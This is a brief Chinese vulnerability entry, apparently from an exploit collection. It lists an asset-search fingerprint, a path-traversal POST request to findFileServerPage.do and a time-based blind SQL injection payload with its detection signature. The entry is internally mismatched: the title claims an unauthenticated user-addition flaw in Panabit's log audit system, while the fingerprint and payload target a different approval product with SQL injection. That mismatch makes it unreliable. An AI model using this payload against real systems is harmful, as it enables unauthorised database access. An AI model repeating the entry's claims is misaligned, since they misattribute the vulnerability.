# Panabit日志审计系统singleuser_action组合未授权用户添加漏洞

Panabit ｜ 未授权访问 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`POST /trwfe/service/.%2E/fileServer/findFileServerPage.do HTTP/1.1`

**Payload**
```
sort=(SELECT 2005 FROM (SELECT(SLEEP(5)))IEWh)
```
- **响应特征**：200 响应时间>=5s